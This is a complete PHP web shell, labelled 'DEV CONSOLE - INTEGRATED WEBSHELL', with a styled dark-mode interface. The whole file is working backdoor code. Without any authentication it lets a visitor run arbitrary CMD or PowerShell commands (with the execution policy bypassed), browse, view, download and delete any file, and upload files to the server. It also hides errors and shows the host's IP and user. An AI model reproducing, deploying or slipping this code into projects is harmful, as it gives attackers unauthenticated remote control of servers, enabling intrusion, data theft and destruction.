<?php
/**
 * DEV CONSOLE - INTEGRATED WEBSHELL
 * Features: File Manager, Upload, Command Exec (CMD/PowerShell)
 */

// 1. ENVIRONMENT & CONFIG
error_reporting(0);
putenv("PATH=C:\Windows\System32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\\");

$cwd = $_POST['cwd'] ?? getcwd();
$cmd = $_POST['cmd'] ?? '';
$mode = $_POST['mode'] ?? 'shell';

// 2. DIRECTORY NAVIGATION
if (isset($_GET['dir'])) {
    $new_dir = $_GET['dir'];
    if (is_dir($new_dir)) {
        $cwd = realpath($new_dir);
    }
}

// 3. FILE ACTIONS
if (isset($_GET['view'])) {
    $file = $_GET['view'];
    if (file_exists($file)) {
        header('Content-Type: text/plain; charset=utf-8');
        readfile($file);
        exit;
    }
}

if (isset($_GET['delete'])) {
    $file = $_GET['delete'];
    if (file_exists($file) && is_file($file)) {
        unlink($file);
    }
    header("Location: ?dir=" . urlencode($cwd));
}

if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file)) {
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Type: application/octet-stream');
        readfile($file);
        exit;
    }
}

// 4. UPLOAD HANDLING
if ($_FILES['upload']['tmp_name'] ?? false) {
    $dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
    move_uploaded_file($_FILES['upload']['tmp_name'], $dest);
}

// 5. HELPER FUNCTIONS
function get_ip() {
    return gethostbyname(gethostname());
}

function exec_command($cmd, $mode, $cwd) {
    if (!$cmd) return 'No command entered.';
    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    
    if ($mode === 'powershell' && $isWin) {
        // Try Sysnative (64-bit redirection) then System32
        $psPath = is_dir('C:\\Windows\\Sysnative') 
            ? 'C:\\Windows\\Sysnative\\WindowsPowerShell\\v1.0\\powershell.exe' 
            : 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe';
            
        $fullCmd = "cd /d \"$cwd\" && $psPath -NoProfile -ExecutionPolicy Bypass -NonInteractive -Command \"$cmd\" 2>&1";
    } else {
        $prefix = $isWin ? "cd /d \"$cwd\" && " : "cd " . escapeshellarg($cwd) . " && ";
        $fullCmd = $prefix . $cmd . ' 2>&1';
    }
    
    $output = shell_exec($fullCmd);
    return $output ?: "[System] Command executed, but returned no output.";
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>DevConsole v2.0</title>
    <style>
        :root { --bg: #0f172a; --panel: #1e293b; --accent: #6366f1; --text: #f1f5f9; --green: #10b981; }
        body { margin:0; font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); height:100vh; display:flex; flex-direction: column; }
        header { background: var(--panel); padding: 10px 20px; border-bottom: 1px solid #334155; display:flex; justify-content: space-between; align-items: center; }
        .badge { background: #334155; padding: 4px 10px; border-radius: 4px; font-size: 12px; font-family: monospace; margin-left: 5px; color: var(--green); }
        
        main { flex: 1; display: flex; gap: 15px; padding: 15px; overflow: hidden; }
        section { background: var(--panel); border-radius: 8px; padding: 15px; border: 1px solid #334155; overflow-y: auto; }
        
        #files { flex: 1.2; }
        table { width: 100%; border-collapse: collapse; font-family: monospace; font-size: 13px; }
        th { text-align: left; padding: 10px; border-bottom: 2px solid #334155; color: #94a3b8; }
        td { padding: 8px 10px; border-bottom: 1px solid #334155; }
        tr:hover { background: #2d3748; }
        
        .btn { text-decoration: none; padding: 3px 7px; border-radius: 3px; font-size: 11px; color: #fff; }
        .btn-v { background: #3b82f6; } .btn-d { background: #10b981; } .btn-del { background: #ef4444; }
        .folder { color: #f59e0b; text-decoration: none; font-weight: bold; }

        #term-sec { flex: 1; display: flex; flex-direction: column; }
        #console { flex: 1; background: #000; color: var(--green); padding: 15px; border-radius: 5px; font-family: 'Consolas', monospace; font-size: 13px; overflow-y: auto; white-space: pre-wrap; border: 1px solid #334155; }
        .input-bar { display: flex; gap: 10px; margin-top: 15px; }
        input[type="text"], select { background: #0f172a; border: 1px solid #475569; color: #fff; padding: 8px; border-radius: 4px; outline: none; }
        button { background: var(--accent); color: #fff; border: none; padding: 8px 20px; border-radius: 4px; cursor: pointer; font-weight: bold; }
        button:hover { background: #4f46e5; }
    </style>
</head>
<body>

<header>
    <strong>⚡ DEV_CONSOLE</strong>
    <div>
        <span class="badge">OS: <?php echo PHP_OS; ?></span>
        <span class="badge">IP: <?php echo get_ip(); ?></span>
        <span class="badge">User: <?php echo get_current_user(); ?></span>
    </div>
</header>

<main>
    <section id="files">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
            <h4 style="margin:0;">📁 <?php echo htmlspecialchars($cwd); ?></h4>
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="upload">
                <button type="submit" style="padding: 4px 10px; font-size:12px;">Upload</button>
            </form>
        </div>
        <table>
            <thead><tr><th>Name</th><th>Size</th><th>Actions</th></tr></thead>
            <tbody>
                <tr><td colspan="3"><a href="?dir=<?php echo urlencode(dirname($cwd)); ?>" class="folder">.. / Parent Directory</a></td></tr>
                <?php foreach(scandir($cwd) as $f): if($f=='.' || $f=='..') continue; $p=$cwd.DIRECTORY_SEPARATOR.$f; $d=is_dir($p); ?>
                <tr>
                    <td><?php echo $d ? "<a href='?dir=".urlencode($p)."' class='folder'>$f</a>" : "📄 $f"; ?></td>
                    <td><?php echo $d ? 'DIR' : round(filesize($p)/1024, 2).' KB'; ?></td>
                    <td>
                        <?php if(!$d): ?>
                            <a href="?view=<?php echo urlencode($p); ?>" target="_blank" class="btn btn-v">View</a>
                            <a href="?download=<?php echo urlencode($p); ?>" class="btn btn-d">Get</a>
                            <a href="?delete=<?php echo urlencode($p); ?>&dir=<?php echo urlencode($cwd); ?>" class="btn btn-del" onclick="return confirm('Delete?')">Del</a>
                        <?php endif; ?>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </section>

    <section id="term-sec">
        <h4 style="margin-top:0;">Terminal Output</h4>
        <div id="console"><?php 
            if($cmd) {
                echo "Exec: $cmd\n";
                echo str_repeat("-", 40) . "\n";
                echo htmlspecialchars(exec_command($cmd, $mode, $cwd));
            } else { echo "Ready."; }
        ?></div>
        <form method="post" class="input-bar">
            <select name="mode">
                <option value="shell" <?php echo $mode=='shell'?'selected':''; ?>>CMD</option>
                <option value="powershell" <?php echo $mode=='powershell'?'selected':''; ?>>PowerShell</option>
            </select>
            <input type="text" name="cmd" placeholder="Enter command..." style="flex:1;" autofocus>
            <input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">
            <button type="submit">Run</button>
        </form>
    </section>
</main>

<script>
    const c = document.getElementById('console');
    c.scrollTop = c.scrollHeight;
</script>
</body>
</html>
